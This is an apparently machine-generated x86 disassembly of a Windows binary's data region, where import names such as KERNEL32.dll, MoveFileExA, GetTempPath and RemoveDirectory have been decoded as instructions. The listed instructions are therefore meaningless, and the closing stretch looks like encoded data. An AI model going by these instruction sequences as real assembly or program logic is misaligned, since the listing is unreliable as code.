  41439c:	dec    edi
  41439d:	bound  ebp,QWORD PTR [edx+0x65]
  4143a0:	arpl   WORD PTR [eax+eax*1+0x0],si
  4143a4:	mov    al,ds:0x65724300
  4143a9:	popa   
  4143aa:	je     0x414411
  4143ac:	dec    eax
  4143ad:	popa   
  4143ae:	je     0x414413
  4143b0:	push   0x73757242
  4143b5:	push   0xaa0000
  4143ba:	inc    ebx
  4143bb:	jb     0x414422
  4143bd:	popa   
  4143be:	je     0x414425
  4143c0:	push   eax
  4143c1:	outs   dx,DWORD PTR ds:[esi]
  4143c2:	ins    BYTE PTR es:[edi],dx
  4143c3:	jns    0x41442c
  4143c5:	outs   dx,DWORD PTR ds:[esi]
  4143c6:	outs   dx,BYTE PTR ds:[esi]
  4143c7:	push   edx
  4143c8:	outs   dx,BYTE PTR ds:[si]
  4143ca:	add    BYTE PTR [eax],al
  4143cc:	add    DWORD PTR [eax],0x626d6f43
  4143d2:	imul   ebp,DWORD PTR [esi+0x65],0x6e6752
  4143d9:	add    dl,dl
  4143db:	add    DWORD PTR [ebx+0x65],edx
  4143de:	je     0x414422
  4143e0:	imul   esi,DWORD PTR [ebp+ebp*2+0x61],0x74694270
  4143e8:	jae    0x4143ea
  4143ea:	lods   al,BYTE PTR ds:[esi]
  4143eb:	add    DWORD PTR [eax+0x6f],edx
  4143ee:	ins    BYTE PTR es:[edi],dx
  4143ef:	jns    0x414433
  4143f1:	gs jp  0x41445d
  4143f4:	gs jb  0x4143f7
  4143f7:	add    al,dl
  4143f9:	add    DWORD PTR [ebx+0x65],edx
  4143fc:	je     0x41443f
  4143fe:	bound  ebp,QWORD PTR [edi+0x72]
  414401:	je     0x414453
  414403:	jb     0x414474
  414405:	arpl   WORD PTR [eax],ax
  414407:	add    BYTE PTR [eax+0x66664f01],ah
  41440d:	jae    0x414474
  41440f:	je     0x414463
  414411:	outs   dx,BYTE PTR ds:[si]
  414413:	add    BYTE PTR [edx+eax*1],dl
  414416:	push   edi
  414417:	imul   esp,DWORD PTR [ebp+eiz*2+0x6e],0x68746150
  41441f:	add    BYTE PTR [eax+0x65724300],dh
  414425:	popa   
  414426:	je     0x41448d
  414428:	push   ebx
  414429:	outs   dx,DWORD PTR ds:[esi]
  41442a:	ins    BYTE PTR es:[edi],dx
  41442b:	imul   esp,DWORD PTR [edx+eax*2+0x72],0x687375
  414433:	add    BYTE PTR [edx+0x74654701],cl
  414439:	push   esp
  41443a:	gs js  0x4144b1
  41443d:	dec    ebp
  41443e:	gs je  0x4144b3
  414441:	imul   esp,DWORD PTR [ebx+0x73],0x16c0041
  414448:	inc    edi
  414449:	gs je  0x41449c
  41444c:	popa   
  41444d:	ins    BYTE PTR es:[edi],dx
  41444e:	gs je  0x4144c5
  414451:	gs inc ebp
  414453:	outs   dx,BYTE PTR ds:[esi]
  414454:	je     0x4144c8
  414456:	imul   esp,DWORD PTR [ebp+0x73],0x4300a200
  41445d:	jb     0x4144c4
  41445f:	popa   
  414460:	je     0x4144c7
  414462:	dec    ecx
  414463:	inc    ebx
  414464:	push   edi
  414465:	add    ah,cl
  414467:	add    DWORD PTR [ebx+0x65],edx
  41446a:	ins    BYTE PTR es:[edi],dx
  41446b:	arpl   WORD PTR gs:[ebx+eax*2+0x6c],si
  414470:	imul   esi,DWORD PTR [eax+0x52],0xd3006e67
  414477:	add    DWORD PTR [ebx+0x65],edx
  41447a:	je     0x4144be
  41447c:	imul   esi,DWORD PTR [ebp+ebp*2+0x61],0x6d694470
  414484:	outs   dx,BYTE PTR gs:[esi]
  414486:	jae    0x4144f1
  414488:	outs   dx,DWORD PTR ds:[esi]
  414489:	outs   dx,BYTE PTR ds:[esi]
  41448a:	inc    ebp
  41448b:	js     0x41448d
  41448d:	add    bh,dl
  41448f:	add    DWORD PTR [ebx+0x65],edx
  414492:	je     0x4144d6
  414494:	jb     0x41450b
  414496:	jae    0x414500
  414498:	dec    edi
  414499:	jb     0x414502
  41449b:	inc    ebp
  41449c:	js     0x41449e
  41449e:	into   
  41449f:	add    DWORD PTR [ebx+0x65],edx
  4144a2:	ins    BYTE PTR es:[edi],dx
  4144a3:	arpl   WORD PTR gs:[edi+ecx*2+0x62],si
  4144a8:	push   0x65
  4144aa:	arpl   WORD PTR [eax+eax*1+0x0],si
  4144ae:	add    DWORD PTR [ecx],0x47
  4144b1:	gs je  0x414508
  4144b4:	gs js  0x41452b
  4144b7:	inc    ebp
  4144b8:	js     0x41452e
  4144ba:	outs   dx,BYTE PTR gs:[esi]
  4144bc:	je     0x41450e
  4144be:	outs   dx,DWORD PTR ds:[esi]
  4144bf:	imul   ebp,DWORD PTR [esi+0x74],0x413233
  4144c6:	xlat   BYTE PTR ds:[ebx]
  4144c7:	add    BYTE PTR [esi+0x69],al
  4144ca:	ins    BYTE PTR es:[edi],dx
  4144cb:	ins    BYTE PTR es:[edi],dx
  4144cc:	push   edx
  4144cd:	outs   dx,BYTE PTR ds:[si]
  4144cf:	add    BYTE PTR [esi+0x65724300],dl
  4144d5:	popa   
  4144d6:	je     0x41453d
  4144d8:	inc    ebp
  4144d9:	ins    BYTE PTR es:[edi],dx
  4144da:	ins    BYTE PTR es:[edi],dx
  4144db:	imul   esi,DWORD PTR [eax+0x74],0x67526369
  4144e2:	outs   dx,BYTE PTR ds:[esi]
  4144e3:	dec    ecx
  4144e4:	outs   dx,BYTE PTR ds:[esi]
  4144e5:	imul   esi,DWORD PTR fs:[edx+0x65],0x6e007463
  4144ed:	add    DWORD PTR [edi+0x65],eax
  4144f0:	je     0x414542
  4144f2:	imul   edi,DWORD PTR [eax+0x65],0x7700006c
  4144f9:	add    DWORD PTR [edi+0x65],eax
  4144fc:	je     0x414551
  4144fe:	je     0x41456f
  414500:	arpl   WORD PTR [ebx+0x4f],bp
  414503:	bound  ebp,QWORD PTR [edx+0x65]
  414506:	arpl   WORD PTR [eax+eax*1+0x0],si
  41450a:	cmp    al,BYTE PTR [ecx]
  41450c:	inc    edi
  41450d:	gs je  0x414553
  414510:	jne    0x414584
  414512:	jb     0x414579
  414514:	outs   dx,BYTE PTR ds:[esi]
  414515:	je     0x414566
  414517:	bound  ebp,QWORD PTR [edx+0x65]
  41451a:	arpl   WORD PTR [eax+eax*1+0x0],si
  41451e:	jno    0x414521
  414520:	inc    edi
  414521:	gs je  0x414576
  414524:	dec    edi
  414525:	push   eax
  414526:	xor    al,BYTE PTR [eax]
  414528:	stos   DWORD PTR es:[edi],eax
  414529:	add    BYTE PTR [ebx+0x72],al
  41452c:	gs popa 
  41452e:	je     0x414595
  414530:	push   edx
  414531:	arpl   WORD PTR gs:[edx+edx*2+0x67],si
  414536:	outs   dx,BYTE PTR ds:[esi]
  414537:	add    BYTE PTR [edx+eax*1],al
  41453a:	push   ebx
  41453b:	je     0x41459e
  41453d:	jb     0x4145b3
  41453f:	inc    esp
  414540:	outs   dx,DWORD PTR ds:[esi]
  414541:	arpl   WORD PTR [edi+0x0],dx
  414544:	jbe    0x414546
  414546:	inc    edx
  414547:	imul   esi,DWORD PTR [edx+eax*2+0x6c],0x75000074
  41454f:	add    BYTE PTR [edx+0x65],al
  414552:	imul   ebp,DWORD PTR [bp+0x50],0x687461
  41455a:	mov    eax,0x61655201
  41455f:	ins    BYTE PTR es:[edi],dx
  414560:	imul   edi,DWORD PTR [edx+0x65],0x656c6150
  414567:	je     0x4145dd
  414569:	add    BYTE PTR gs:[eax],al
  41456c:	inc    edi
  41456d:	inc    esp
  41456e:	dec    ecx
  41456f:	xor    esi,DWORD PTR [edx]
  414571:	cs fs ins BYTE PTR es:[edi],dx
  414574:	ins    BYTE PTR es:[edi],dx
  414575:	add    BYTE PTR [eax+0x1],ah
  414578:	inc    esi
  414579:	imul   ebp,DWORD PTR [esi+0x64],0x73726946
  414580:	je     0x4145c8
  414582:	imul   ebp,DWORD PTR [ebp+eiz*2+0x57],0x3040000
  41458a:	dec    esp
  41458b:	gs popa 
  41458d:	jbe    0x4145f4
  41458f:	inc    ebx
  414590:	jb     0x4145fb
  414592:	je     0x4145fd
  414594:	arpl   WORD PTR [ecx+0x6c],sp
  414597:	push   ebx
  414598:	arpl   WORD PTR gs:[ecx+ebp*2+0x6f],si
  41459d:	outs   dx,BYTE PTR ds:[esi]
  41459e:	add    BYTE PTR [eax],al
  4145a0:	add    eax,DWORD PTR [ecx]
  4145a2:	inc    esp
  4145a3:	gs ins BYTE PTR es:[edi],dx
  4145a5:	gs je  0x41460d
  4145a8:	inc    esi
  4145a9:	imul   ebp,DWORD PTR [ebp+eiz*2+0x41],0x4902b900
  4145b1:	outs   dx,BYTE PTR ds:[esi]
  4145b2:	imul   esi,DWORD PTR [ecx+ebp*2+0x61],0x657a696c
  4145ba:	inc    ebx
  4145bb:	jb     0x414626
  4145bd:	je     0x414628
  4145bf:	arpl   WORD PTR [ecx+0x6c],sp
  4145c2:	push   ebx
  4145c3:	arpl   WORD PTR gs:[ecx+ebp*2+0x6f],si
  4145c8:	outs   dx,BYTE PTR ds:[esi]
  4145c9:	add    BYTE PTR [edx+0x6c614300],ah
  4145cf:	ins    BYTE PTR es:[edi],dx
  4145d0:	dec    esi
  4145d1:	popa   
  4145d2:	ins    DWORD PTR es:[edi],dx
  4145d3:	gs fs push eax
  4145d6:	imul   esi,DWORD PTR [eax+0x65],0x12000057
  4145dd:	add    al,0x53
  4145df:	gs je  0x414627
  4145e2:	jb     0x414656
  4145e4:	outs   dx,DWORD PTR ds:[esi]
  4145e5:	jb     0x414634
  4145e7:	outs   dx,DWORD PTR ds:[esi]
  4145e8:	fs add BYTE PTR gs:[eax],al
  4145ec:	pop    edi
  4145ed:	add    al,BYTE PTR [edi+0x65]
  4145f0:	je     0x414646
  4145f2:	gs ins DWORD PTR es:[edi],dx
  4145f4:	jo     0x41463c
  4145f6:	imul   ebp,DWORD PTR [ebp+eiz*2+0x4e],0x41656d61
  4145fe:	add    BYTE PTR [eax],al
  414600:	cmc    
  414601:	add    BYTE PTR [ebx+0x72],al
  414604:	gs popa 
  414606:	je     0x41466d
  414608:	push   edi
  414609:	popa   
  41460a:	imul   esi,DWORD PTR [ecx+eiz*2+0x62],0x6954656c
  414612:	ins    DWORD PTR es:[edi],dx
  414613:	gs jb  0x41466d
  414616:	add    BYTE PTR [eax],al
  414618:	pop    ebp
  414619:	add    DWORD PTR [esi+0x69],eax
  41461c:	outs   dx,BYTE PTR ds:[esi]
  41461d:	fs inc esi
  41461f:	imul   esi,DWORD PTR [edx+0x73],0x6c694674
  414626:	gs inc ecx
  414628:	add    BYTE PTR [eax],al
  41462a:	test   al,0x2
  41462c:	dec    eax
  41462d:	gs popa 
  41462f:	jo     0x41467d
  414631:	outs   dx,DWORD PTR ds:[esi]
  414632:	arpl   WORD PTR [ebx+0x0],bp
  414635:	add    BYTE PTR [ebx+eax*1+0x6f6d6552],dh
  41463c:	jbe    0x4146a3
  41463e:	inc    esp
  41463f:	imul   esi,DWORD PTR [edx+0x65],0x726f7463
  414646:	jns    0x41469f
  414648:	add    BYTE PTR [eax],al
  41464a:	rol    BYTE PTR [eax],cl
  41464c:	inc    ebx
  41464d:	jb     0x4146b4
  41464f:	popa   
  414650:	je     0x4146b7
  414652:	inc    esi
  414653:	imul   ebp,DWORD PTR [ebp+eiz*2+0x4d],0x69707061
  41465b:	outs   dx,BYTE PTR ds:[esi]
  41465c:	addr16 push edi
  41465e:	add    BYTE PTR [eax],al
  414660:	adc    al,0x3
  414662:	dec    esp
  414663:	outs   dx,DWORD PTR ds:[esi]
  414664:	arpl   WORD PTR [ecx+0x6c],sp
  414667:	push   ebx
  414668:	imul   edi,DWORD PTR [edx+0x65],0x47024200
  41466f:	gs je  0x4146c5
  414672:	push   0x5074726f
  414677:	popa   
  414678:	je     0x4146e2
  41467a:	dec    esi
  41467b:	popa   
  41467c:	ins    DWORD PTR es:[edi],dx
  41467d:	gs inc ecx
  41467f:	add    BYTE PTR ds:0x74654702,cl
  414685:	dec    ebp
  414686:	outs   dx,DWORD PTR ds:[esi]
  414687:	fs jne 0x4146f6
  41468a:	gs dec eax
  41468c:	popa   
  41468d:	outs   dx,BYTE PTR ds:[esi]
  41468e:	fs ins BYTE PTR es:[edi],dx
  414690:	gs push edi
  414692:	add    BYTE PTR [eax],al
  414694:	mov    ds:0x69725704,eax
  414699:	je     0x414700
  41469b:	inc    esi
  41469c:	imul   ebp,DWORD PTR [ebp+eiz*2+0x0],0x6c470298
  4146a4:	outs   dx,DWORD PTR ds:[esi]
  4146a5:	bound  esp,QWORD PTR [ecx+0x6c]
  4146a8:	push   ebx
  4146a9:	imul   edi,DWORD PTR [edx+0x65],0xea0000
  4146b0:	inc    ebx
  4146b1:	jb     0x414718
  4146b3:	popa   
  4146b4:	je     0x41471b
  4146b6:	push   ebx
  4146b7:	gs ins DWORD PTR es:[edi],dx
  4146b9:	popa   
  4146ba:	jo     0x414724
  4146bc:	outs   dx,DWORD PTR ds:[esi]
  4146bd:	jb     0x414724
  4146bf:	push   edi
  4146c0:	add    BYTE PTR [eax],al
  4146c2:	jmp    0x4146c5
  4146c4:	inc    edi
  4146c5:	gs je  0x41470e
  4146c8:	imul   ebp,DWORD PTR [ebp+eiz*2+0x41],0x69727474
  4146d0:	bound  esi,QWORD PTR [ebp+0x74]
  4146d3:	gs jae 0x41471b
  4146d6:	js     0x41472f
  4146d8:	add    BYTE PTR [eax],al
  4146da:	mov    ebx,0x73655203
  4146df:	gs je  0x414727
  4146e2:	jbe    0x414749
  4146e4:	outs   dx,BYTE PTR ds:[esi]
  4146e5:	je     0x4146e7
  4146e7:	add    BYTE PTR [esi+0x4],cl
  4146ea:	push   ebx
  4146eb:	ins    BYTE PTR es:[edi],dx
  4146ec:	gs gs jo 0x414735
  4146f0:	js     0x4146f2
  4146f2:	int3   
  4146f3:	add    al,0x6c
  4146f5:	jae    0x41476b
  4146f7:	jb     0x41475c
  4146f9:	jo     0x414774
  4146fb:	outs   dx,BYTE PTR ds:[esi]
  4146fc:	push   edi
  4146fd:	add    dl,cl
  4146ff:	add    BYTE PTR [ebx+0x72],al
  414702:	gs popa 
  414704:	je     0x41476b
  414706:	inc    ebp
  414707:	jbe    0x41476e
  414709:	outs   dx,BYTE PTR ds:[esi]
  41470a:	je     0x41474d
  41470c:	add    BYTE PTR [eax],al
  41470e:	push   eax
  41470f:	add    al,BYTE PTR [edi+0x65]
  414712:	je     0x414767
  414714:	jns    0x414789
  414716:	je     0x41477d
  414718:	ins    DWORD PTR es:[edi],dx
  414719:	inc    esp
  41471a:	imul   esi,DWORD PTR [edx+0x65],0x726f7463
  414721:	jns    0x41477a
  414723:	add    BYTE PTR [edx+0x4],bh
  414726:	push   esi
  414727:	gs jb  0x41477d
  41472a:	gs je  0x414770
  41472d:	outs   dx,DWORD PTR ds:[esi]
  41472e:	outs   dx,BYTE PTR ds:[esi]
  41472f:	imul   esi,DWORD PTR fs:[ecx+ebp*2+0x6f],0x73614d6e
  414738:	imul   eax,DWORD PTR [eax],0x7
  41473b:	add    ecx,DWORD PTR [edi+ebp*2+0x61]
  41473f:	fs dec esp
  414741:	imul   esp,DWORD PTR [edx+0x72],0x45797261
  414748:	js     0x4147a1
  41474a:	add    BYTE PTR [eax],al
  41474c:	pop    edi
  41474d:	add    al,0x54
  41474f:	ins    BYTE PTR es:[edi],dx
  414750:	jae    0x414799
  414752:	gs je  0x4147ab
  414755:	popa   
  414756:	ins    BYTE PTR es:[edi],dx
  414757:	jne    0x4147be
  414759:	add    bl,cl
  41475b:	add    cl,BYTE PTR [ecx+0x73]
  41475e:	inc    edx
  41475f:	popa   
  414760:	fs push edx
  414762:	gs popa 
  414764:	fs push eax
  414766:	je     0x4147da
  414768:	add    BYTE PTR [eax],al
  41476a:	inc    ebx
  41476b:	add    al,BYTE PTR [edi+0x65]
  41476e:	je     0x4147c3
  414770:	push   0x5074726f
  414775:	popa   
  414776:	je     0x4147e0
  414778:	dec    esi
  414779:	popa   
  41477a:	ins    DWORD PTR es:[edi],dx
  41477b:	gs push edi
  41477d:	add    BYTE PTR [edx+eax*1+0x47],dh
  414781:	gs je  0x4147d9
  414784:	jae    0x4147eb
  414786:	jb     0x4147cc
  414788:	gs popaw 
  41478b:	jne    0x4147f9
  41478d:	je     0x4147db
  41478f:	popa   
  414790:	outs   dx,BYTE PTR ds:[esi]
  414791:	addr16 dec ecx
  414793:	inc    esp
  414794:	add    BYTE PTR [eax],al
  414796:	adc    DWORD PTR [ebx],eax
  414798:	dec    esp
  414799:	outs   dx,DWORD PTR ds:[esi]
  41479a:	arpl   WORD PTR [ecx+0x6c],sp
  41479d:	dec    esp
  41479e:	outs   dx,DWORD PTR ds:[esi]
  41479f:	arpl   WORD PTR [ebx+0x0],bp
  4147a2:	mov    ecx,0x6e6f4300
  4147a7:	jbe    0x41480e
  4147a9:	jb     0x41481f
  4147ab:	inc    esp
  4147ac:	gs popaw 
  4147af:	jne    0x41481d
  4147b1:	je     0x4147ff
  4147b3:	outs   dx,DWORD PTR ds:[esi]
  4147b4:	arpl   WORD PTR [ecx+0x6c],sp
  4147b7:	add    BYTE PTR gs:[eax],al
  4147ba:	inc    BYTE PTR [ecx]
  4147bc:	inc    edi
  4147bd:	gs je  0x41480c
  4147c0:	outs   dx,DWORD PTR ds:[esi]
  4147c1:	arpl   WORD PTR [ecx+0x6c],sp
  4147c4:	gs dec ecx
  4147c6:	outs   dx,BYTE PTR ds:[esi]
  4147c7:	outs   dx,WORD PTR ds:[esi]
  4147c9:	inc    ecx
  4147ca:	add    BYTE PTR [eax],al
  4147cc:	loopne 0x4147ce
  4147ce:	inc    ebx
  4147cf:	jb     0x414836
  4147d1:	popa   
  4147d2:	je     0x414839
  4147d4:	dec    ebp
  4147d5:	jne    0x41484b
  4147d7:	gs js  0x414831
  4147da:	add    BYTE PTR [eax],al
  4147dc:	adc    eax,0x74655304
  4147e1:	inc    esi
  4147e2:	imul   ebp,DWORD PTR [ebp+eiz*2+0x41],0x54736970
  4147ea:	outs   dx,DWORD PTR ds:[esi]
  4147eb:	dec    edi
  4147ec:	inc    ebp
  4147ed:	dec    ebp
  4147ee:	add    BYTE PTR [eax],al
  4147f0:	xor    DWORD PTR [ecx],eax
  4147f2:	inc    ebp
  4147f3:	jae    0x414858
  4147f5:	popa   
  4147f6:	jo     0x41485d
  4147f8:	inc    ebx
  4147f9:	outs   dx,DWORD PTR ds:[esi]
  4147fa:	ins    DWORD PTR es:[edi],dx
  4147fb:	ins    DWORD PTR es:[edi],dx
  4147fc:	inc    esi
  4147fd:	jne    0x41486d
  4147ff:	arpl   WORD PTR [ecx+ebp*2+0x6f],si
  414803:	outs   dx,BYTE PTR ds:[esi]
  414804:	add    BYTE PTR [eax],al
  414806:	ss add al,0x53
  414809:	gs je  0x414860
  41480c:	push   0x64616572
  414811:	inc    ebx
  414812:	outs   dx,DWORD PTR ds:[esi]
  414813:	outs   dx,BYTE PTR ds:[esi]
  414814:	je     0x41487b
  414816:	js     0x41488c
  414818:	add    BYTE PTR [eax],al
  41481a:	sub    eax,DWORD PTR [ebx]
  41481c:	dec    ebp
  41481d:	outs   dx,DWORD PTR ds:[esi]
  41481e:	jbe    0x414885
  414820:	inc    esi
  414821:	imul   ebp,DWORD PTR [ebp+eiz*2+0x45],0x67004178
  414829:	add    al,BYTE PTR [edi+0x65]
  41482c:	je     0x414882
  41482e:	push   0x64616572
  414833:	dec    esp
  414834:	outs   dx,DWORD PTR ds:[esi]
  414835:	arpl   WORD PTR [ecx+0x6c],sp
  414838:	add    BYTE PTR gs:[ebp+0x4],ch
  41483c:	push   ebp
  41483d:	outs   dx,BYTE PTR ds:[esi]
  41483e:	ins    BYTE PTR es:[edi],dx
  41483f:	outs   dx,DWORD PTR ds:[esi]
  414840:	arpl   WORD PTR [ebx+0x46],bp
  414843:	imul   ebp,DWORD PTR [ebp+eiz*2+0x0],0x41007d00
  41484b:	fs fs inc ecx
  41484e:	je     0x4148bf
  414850:	ins    DWORD PTR es:[edi],dx
  414851:	push   edi
  414852:	add    BYTE PTR [eax],al
  414854:	push   ebp
  414855:	add    al,BYTE PTR [edi+0x65]
  414858:	je     0x4148ad
  41485a:	jns    0x4148cf
  41485c:	je     0x4148c3
  41485e:	ins    DWORD PTR es:[edi],dx
  41485f:	push   esp
  414860:	imul   ebp,DWORD PTR [ebp+0x65],0x756a6441
  414867:	jae    0x4148dd
  414869:	ins    DWORD PTR es:[edi],dx
  41486a:	outs   dx,BYTE PTR gs:[esi]
  41486c:	je     0x41486e
  41486e:	mov    WORD PTR [edi+edx*2],es
  414871:	popa   
  414872:	imul   esi,DWORD PTR [esi+eax*2+0x6f],0x6c754d72
  41487a:	je     0x4148e5
  41487c:	jo     0x4148ea
  41487e:	gs dec edi
  414880:	bound  ebp,QWORD PTR [edx+0x65]
  414883:	arpl   WORD PTR [ebx+esi*2+0x0],si
  414887:	add    BYTE PTR [ecx+0x2],ah
  41488a:	inc    edi
  41488b:	gs je  0x4148e2
  41488e:	gs ins DWORD PTR es:[edi],dx
  414890:	jo     0x4148e2
  414892:	popa   
  414893:	je     0x4148fd
  414895:	inc    ecx
  414896:	add    BYTE PTR [eax],al
  414898:	out    dx,al
  414899:	add    DWORD PTR [edi+0x65],eax
  41489c:	je     0x4148e4
  41489e:	imul   ebp,DWORD PTR [ebp+eiz*2+0x53],0x657a69
  4148a6:	mov    BYTE PTR [esp+ebp*2],0x73
  4148aa:	je     0x41491e
  4148ac:	arpl   WORD PTR [ebp+0x70],bp
  4148af:	imul   edx,DWORD PTR [edi+0x0],0x6c470290
  4148b6:	outs   dx,DWORD PTR ds:[esi]
  4148b7:	bound  esp,QWORD PTR [ecx+0x6c]
  4148ba:	inc    esi
  4148bb:	jb     0x414922
  4148bd:	add    BYTE PTR gs:[eax],al
  4148c0:	rol    DWORD PTR [eax],1
  4148c2:	inc    ebx
  4148c3:	jb     0x41492a
  4148c5:	popa   
  4148c6:	je     0x41492d
  4148c8:	inc    esi
  4148c9:	imul   ebp,DWORD PTR [ebp+eiz*2+0x4d],0x69707061
  4148d1:	outs   dx,BYTE PTR ds:[esi]
  4148d2:	addr16 inc ecx
  4148d4:	add    BYTE PTR [eax],al
  4148d6:	cmp    al,BYTE PTR [ebx]
  4148d8:	dec    edi
  4148d9:	jo     0x414940
  4148db:	outs   dx,BYTE PTR ds:[esi]
  4148dc:	inc    esi
  4148dd:	imul   ebp,DWORD PTR [ebp+eiz*2+0x0],0x52454b00
  4148e5:	dec    esi
  4148e6:	inc    ebp
  4148e7:	dec    esp
  4148e8:	xor    esi,DWORD PTR [edx]
  4148ea:	cs fs ins BYTE PTR es:[edi],dx
  4148ed:	ins    BYTE PTR es:[edi],dx
  4148ee:	add    BYTE PTR [eax],al
  4148f0:	push   ss
  4148f1:	add    BYTE PTR [eax+0x72],dl
  4148f4:	imul   ebp,DWORD PTR [esi+0x74],0x45676c44
  4148fb:	js     0x414954
  4148fd:	add    BYTE PTR [ebx],dl
  4148ff:	add    BYTE PTR [eax+0x61],dl
  414902:	addr16 gs push ebx
  414905:	gs je  0x41497d
  414908:	jo     0x41494e
  41490a:	ins    BYTE PTR es:[edi],dx
  41490b:	addr16 push edi
  41490d:	add    BYTE PTR [edx],al
  41490f:	add    BYTE PTR [ebx+0x68],al
  414912:	outs   dx,DWORD PTR ds:[esi]
  414913:	outs   dx,DWORD PTR ds:[esi]
  414914:	jae    0x41497b
  414916:	inc    ebx
  414917:	outs   dx,DWORD PTR ds:[esi]
  414918:	ins    BYTE PTR es:[edi],dx
  414919:	outs   dx,DWORD PTR ds:[esi]
  41491a:	jb     0x414973
  41491c:	add    BYTE PTR [eax],al
  41491e:	or     al,0x0
  414920:	inc    edi
  414921:	gs je  0x41496a
  414924:	imul   ebp,DWORD PTR [ebp+eiz*2+0x54],0x656c7469
  41492c:	push   edi
  41492d:	add    BYTE PTR [edi],cl
  41492f:	add    BYTE PTR [edi+0x65],al
  414932:	je     0x414987
  414934:	popa   
  414935:	jbe    0x41499c
  414937:	inc    esi
  414938:	imul   ebp,DWORD PTR [ebp+eiz*2+0x4e],0x41656d61
  414940:	add    BYTE PTR [eax],al
  414942:	arpl   WORD PTR [edi+0x6d],bp
  414945:	fs ins BYTE PTR es:[edi],dx
  414947:	xor    esi,DWORD PTR [bp+si]
  41494a:	cs fs ins BYTE PTR es:[edi],dx
  41494d:	ins    BYTE PTR es:[edi],dx
  41494e:	add    BYTE PTR [eax],al
  414950:	inc    esp
  414951:	add    BYTE PTR [eax+0x61],dl
  414954:	je     0x4149be
  414956:	inc    esi
  414957:	imul   ebp,DWORD PTR [ebp+eiz*2+0x45],0x74736978
  41495f:	jae    0x4149a2
  414961:	add    BYTE PTR [ebx+0x48],dl
  414964:	dec    esp
  414965:	push   edi
  414966:	inc    ecx
  414967:	push   eax
  414968:	dec    ecx
  414969:	cs fs ins BYTE PTR es:[edi],dx
  41496c:	ins    BYTE PTR es:[edi],dx
  41496d:	add    BYTE PTR [ebx+0x70],dh
  414970:	push   ecx
  414971:	dec    edx
  414972:	push   0x47
  414974:	jne    0x4149bc
  414976:	mov    dl,0x4d
  414978:	inc    ecx
  414979:	add    BYTE PTR [edx-0x41ffbeb3],bh
  41497f:	dec    ebx
  414980:	inc    ecx
  414981:	add    bh,ch
  414983:	or     esi,DWORD PTR [edx+0x3a4f710e]
  414989:	dec    edi
  41498a:	ja     0x4149db
  41498c:	cmp    eax,0x304f4f4f
  414991:	dec    edi
  414992:	jb     0x4149e3
  414994:	xor    ecx,DWORD PTR [edi+0x5e]
  414997:	dec    edi
  414998:	ss dec edi
  41499a:	jnp    0x4149eb
  41499c:	sub    DWORD PTR [edi+0x3a],ecx
  41499f:	dec    edi
  4149a0:	sub    cl,BYTE PTR [edi+0x1e]
  4149a3:	push   edx
  4149a4:	pop    ds
  4149a5:	push   ebx
  4149a6:	xor    DWORD PTR [edi+0x71],ecx
  4149a9:	dec    edi
  4149aa:	cmp    cl,BYTE PTR [edi+0x77]
  4149ad:	dec    edi
  4149ae:	cmp    eax,0x304f4f4f
  4149b3:	dec    edi
  4149b4:	jb     0x414a05
  4149b6:	xor    ecx,DWORD PTR [edi+0x5e]
  4149b9:	dec    edi
  4149ba:	ss dec edi
  4149bc:	popa   
  4149bd:	dec    edi
  4149be:	sub    DWORD PTR [edi+0x3a],ecx
  4149c1:	dec    edi
  4149c2:	sub    cl,BYTE PTR [edi+0x1e]
  4149c5:	bound  ebx,QWORD PTR [edi]
  4149c7:	arpl   WORD PTR [ecx],si
  4149c9:	dec    edi
  4149ca:	jno    0x414a1b
  4149cc:	cmp    cl,BYTE PTR [edi+0x6a]
  4149cf:	dec    edi
  4149d0:	cmp    eax,0x314f7b4f
  4149d5:	dec    edi
  4149d6:	dec    esp
  4149d7:	dec    edi
  4149d8:	xor    al,0x4f
  4149da:	cmp    cl,BYTE PTR [edi+0x28]
  4149dd:	dec    edi
  4149de:	push   ds
  4149df:	jb     0x414a00
  4149e1:	jae    0x4149f2
  4149e3:	add    DWORD PTR [eax],0xffffff80
  4149e6:	jo     0x414978
  4149e8:	jno    0x41497b
  4149ea:	aas    
  4149eb:	dec    edi
  4149ec:	jbe    0x414a3d
  4149ee:	cmp    cl,BYTE PTR [edi+0x76]
  4149f1:	dec    edi
  4149f2:	ds dec edi
  4149f4:	dec    esp
  4149f5:	dec    edi
  4149f6:	xor    DWORD PTR [edi+0x7b],ecx
  4149f9:	dec    edi
  4149fa:	xor    eax,0x364f3a4f
  4149ff:	dec    edi
  414a00:	push   ds
  414a01:	sbb    BYTE PTR [edi],0x83
  414a04:	setae  BYTE PTR [eax]
  414a07:	nop
  414a08:	jo     0x4149aa
  414a0a:	jno    0x4149ad
  414a0c:	aas    
  414a0d:	dec    edi
  414a0e:	jbe    0x414a5f
  414a10:	cmp    cl,BYTE PTR [edi+0x76]
  414a13:	dec    edi
  414a14:	ds dec edi
  414a16:	dec    esp
  414a17:	dec    edi
  414a18:	xor    DWORD PTR [edi+0x61],ecx
  414a1b:	dec    edi
  414a1c:	xor    eax,0x364f3a4f
  414a21:	dec    edi
  414a22:	push   ds
  414a23:	xchg   edx,eax
  414a24:	pop    ds
  414a25:	xchg   ebx,eax
  414a26:	bt     DWORD PTR [eax],eax
  414a29:	mov    al,ds:0xb171b070
  414a2e:	aas    
  414a2f:	dec    edi
  414a30:	pusha  
  414a31:	dec    edi
  414a32:	cmp    cl,BYTE PTR [edi+0x4e]
  414a35:	dec    edi
  414a36:	cmp    eax,0x314f7b4f
  414a3b:	dec    edi
  414a3c:	dec    ecx
  414a3d:	dec    edi
  414a3e:	xor    al,0x4f
  414a40:	cmp    cl,BYTE PTR [edi+0x36]
  414a43:	dec    edi
  414a44:	push   ds
  414a45:	mov    ds:0xb30fa31f,al
  414a4a:	add    BYTE PTR [eax-0x3e8e3f90],dh
  414a50:	aas    
  414a51:	dec    edi
  414a52:	pusha  
  414a53:	dec    edi
  414a54:	cmp    cl,BYTE PTR [edi+0x4e]
  414a57:	dec    edi
  414a58:	cmp    eax,0x314f704f
  414a5d:	dec    edi
  414a5e:	pop    edi
  414a5f:	dec    edi
  414a60:	xor    ecx,DWORD PTR [edi+0x3a]
  414a63:	dec    edi
  414a64:	xor    eax,0x1fb21e4f
  414a69:	mov    bl,0xf
  414a6b:	ret    
  414a6c:	add    al,al
  414a6e:	jo     0x414a40
  414a70:	jno    0x414a43
  414a72:	aas    
  414a73:	dec    edi
  414a74:	pusha  
  414a75:	dec    edi
  414a76:	cmp    cl,BYTE PTR [edi+0x4e]
  414a79:	dec    edi
  414a7a:	cmp    eax,0x314f6a4f
  414a7f:	dec    edi
  414a80:	dec    esi
  414a81:	dec    edi
  414a82:	xor    al,0x4f
